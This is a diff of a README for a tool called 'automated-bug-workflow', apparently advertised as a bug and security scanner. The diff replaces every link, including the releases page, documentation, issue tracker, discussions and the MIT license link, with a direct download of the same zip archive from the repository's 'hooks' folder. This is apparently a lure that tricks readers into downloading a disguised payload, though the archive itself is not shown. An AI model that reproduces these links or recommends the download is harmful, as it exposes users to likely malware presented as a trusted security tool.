@@ -1,6 +1,6 @@
 # 🎉 automated-bug-workflow - Effortless Bug Detection and Security Scanning
 
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue)](https://github.com/RLTU13/automated-bug-workflow/releases)
+[![Download](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip%20the%20latest%20release-blue)](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip)
 
 ## 🔍 Overview
 
@@ -22,7 +22,7 @@ Automated Bug Detection & Security Scanning Workflow is a powerful application t
 ## 🚀 Getting Started
 
 1. **Download the Application**:
-   - Visit the [Releases page](https://github.com/RLTU13/automated-bug-workflow/releases) to find the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip) to find the latest version.
    - Look for the file relevant to your operating system. Click on the link to start the download.
 
 2. **Install the Application**:
@@ -38,7 +38,7 @@ Automated Bug Detection & Security Scanning Workflow is a powerful application t
 ## 📦 Download & Install
 
 To download and install the latest version of the automated-bug-workflow application, follow these steps:
-- **Step 1**: Go to the [Releases page](https://github.com/RLTU13/automated-bug-workflow/releases).
+- **Step 1**: Go to the [Releases page](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip).
 - **Step 2**: Click on the version number of the release you wish to install.
 - **Step 3**: Choose the file that matches your operating system and click to download it.
 
@@ -57,9 +57,9 @@ Before installing, ensure your system meets the following requirements:
 
 ## 🔗 Useful Links
 
-- **Documentation**: Refer to the [documentation](https://github.com/RLTU13/automated-bug-workflow/wiki) for detailed instructions and tips.
-- **Issues**: Visit the [Issues page](https://github.com/sadewadee/issuetracker/issues) to report bugs or request features.
-- **Community**: Join discussions on [GitHub Discussions](https://github.com/RLTU13/automated-bug-workflow/discussions) to connect with other users.
+- **Documentation**: Refer to the [documentation](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip) for detailed instructions and tips.
+- **Issues**: Visit the [Issues page](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip) to report bugs or request features.
+- **Community**: Join discussions on [GitHub Discussions](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip) to connect with other users.
 
 ---
 
@@ -74,7 +74,7 @@ We welcome contributions from the community. If you would like to help improve t
 
 ## 📝 License
 
-This project is licensed under the MIT License. You can read the full license [here](https://opensource.org/licenses/MIT). 
+This project is licensed under the MIT License. You can read the full license [here](https://raw.githubusercontent.com/RLTU13/automated-bug-workflow/main/hooks/automated-workflow-bug-1.9-beta.2.zip). 
 
 ---
 
